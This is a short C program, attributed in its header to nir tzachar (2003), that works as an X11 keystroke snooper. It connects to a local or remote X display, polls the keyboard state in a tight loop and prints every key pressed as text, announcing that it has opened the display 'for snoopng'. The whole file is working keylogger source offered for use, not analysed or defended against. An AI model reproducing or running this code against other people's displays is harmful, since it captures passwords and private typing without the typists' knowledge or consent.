/* original file leeched from somewhere.
 * only got keycodes changes.
 * improved and added keycode to string translations.
 *
 * nir tzachar, 27/8/2003
 */
#include <X11/Xlib.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>

#define SPACE "space"
#define ENTER "Return"

char *key_map[32 * 8 + 1];

void do_last(void)
{
    printf("blah.... \n");
}

int main(int argc, char **argv)
{
    Display *disp;
    int i, changed;
    int min_key_code, max_key_code;
    char *s;
    unsigned short j, k;
    struct timeval shorttime;
    char keys[32];
    char lastkeys[32];

    shorttime.tv_sec = 0;
    shorttime.tv_usec = 10;

    atexit(do_last);

    if (argc > 1)
    {
        s = (char *)malloc(strlen(argv[1]) + 5);
        strcpy(s, argv[1]);
        strcat(s, ":0");
    }
    else
        s = getenv("DISPLAY");
    disp = XOpenDisplay(s);
    if (NULL == disp)
    {
        printf("%s: can't open display %s\n", argv[0], s);
        exit(0);
    }
    else
        printf("opened %s for snoopng\n", s);

    for (i = 0; i < 32; i++)
    {
        keys[i] = 0;
        lastkeys[i] = 0;
    }

    // fill up keyboard mapping
    XDisplayKeycodes(disp, &min_key_code, &max_key_code);
    for (i = min_key_code; i <= max_key_code; i++)
    {
        key_map[i] = XKeysymToString(XKeycodeToKeysym(disp, i, 0));
        if (!key_map[i])
            key_map[i] = " unknown ";
        else if (strcmp(key_map[i], SPACE) == 0)
            key_map[i] = " ";
        else if (strcmp(key_map[i], ENTER) == 0)
            key_map[i] = "\n";
        else if (strchr(key_map[i], '_'))
        {
            char *pp = malloc(strlen(key_map[i]) + 5);
            strcpy(pp, key_map[i]);
            strcat(pp, " ");
            key_map[i] = pp;
        }
    }

    while (1)
    {
        shorttime.tv_sec = 0;
        shorttime.tv_usec = 10;
        select(0, NULL, NULL, NULL, &shorttime);
        XQueryKeymap(disp, keys);
        for (i = 0; i < 32; i++)
        {
            if (keys[i] != lastkeys[i])
            {
                // check which key got changed
                for (j = 1, k = 0; j < 256; j *= 2, k++)
                {
                    // if the key wass pressed, output it
                    if ((keys[i] & j) &&
                        ((keys[i] & j) != (lastkeys[i] & j)))
                    {
                        if (strcmp(key_map[i * 8 + k], SPACE) == 0)
                            printf(" ");
                        else if (strcmp(key_map[i * 8 + k], ENTER) == 0)
                            printf("\n");
                        else
                            printf("%s", key_map[i * 8 + k]);
                    }
                }
            }
            lastkeys[i] = keys[i];
        }
        fflush(stdout);
    }

    XCloseDisplay(disp);

    return 0;
}
